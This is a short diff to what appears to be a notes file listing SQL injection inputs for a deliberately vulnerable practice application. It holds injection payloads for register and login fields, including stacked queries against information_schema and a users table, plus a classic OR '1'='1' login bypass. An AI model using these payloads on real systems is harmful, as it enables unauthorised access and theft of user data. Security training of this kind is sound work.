@@ -2,6 +2,7 @@
 Register:
     any value before password and then:
     password: '); SELECT * FROM information_schema.tables LIMIT 1; -- 
+                '); SELECT * FROM users_vulnerable limit 2 ; -- 
 
 Login:
     username: bla ' OR '1' = '1
